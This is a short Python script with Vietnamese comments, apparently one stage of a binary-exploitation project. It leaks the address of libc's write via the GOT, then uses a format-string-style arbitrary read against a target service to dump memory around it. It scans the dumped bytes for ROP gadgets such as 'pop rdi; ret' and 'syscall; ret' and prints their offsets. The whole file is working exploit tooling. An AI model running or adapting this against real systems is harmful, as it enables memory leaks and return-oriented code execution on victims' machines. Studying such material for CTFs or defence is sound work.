#!/usr/bin/env python3
"""Quet libc quanh `write` tim gadget `pop <reg>; ret` va `syscall; ret`."""
import re, sys
sys.path.insert(0, "."); sys.path.insert(0, "..")
from probe import Renderer
from batch import plan
from exploit import q, leak_ptr, GOT_WRITE

PAT = [(b"\x58\xc3","pop rax;ret"),(b"\x5e\xc3","pop rsi;ret"),(b"\x5a\xc3","pop rdx;ret"),
       (b"\x59\xc3","pop rcx;ret"),(b"\x5f\xc3","pop rdi;ret"),(b"\x0f\x05\xc3","syscall;ret"),
       (b"\x5d\xc3","pop rbp;ret"),(b"\x5b\xc3","pop rbx;ret"),(b"\x41\x5c\xc3","pop r12;ret")]

def fresh():
    r=Renderer(); r.drain(); r.buf=b''
    return r, leak_ptr(r, GOT_WRITE)

def scan(r, wa, lo, hi, stride, size=20):
    found={}
    start=lo
    while start<hi:
        offs=list(range(start,min(start+stride*size,hi),stride))
        if not offs: break
        try:
            spec,first,off=plan(len(offs),b's')
            p=spec+b'\n'+b'.'*(off-len(spec)-1)+b''.join(q(wa+a) for a in offs)
            out=r.render(p,6.0); parts=out.split(b'|')[:-1]
        except Exception:
            r,wa=fresh(); start+=stride*size; continue
        for a,s in zip(offs,parts):
            for pat,name in PAT:
                k=s.find(pat)
                if k>=0: found.setdefault(name,set()).add(a+k)
        start+=stride*size
    return found,r,wa

if __name__=='__main__':
    r,wa=fresh()
    print(f'[*] write = {wa:#x}')
    found,r,wa=scan(r,wa,-0x30000,0x30000,4)
    for n,hs in sorted(found.items()):
        hs=sorted(hs); print(f'[+] {n:14s} {len(hs):4d}  write{hs[0]:+#x} .. write{hs[-1]:+#x}')
    if not found: print('[-] khong thay gi')
    r.close()
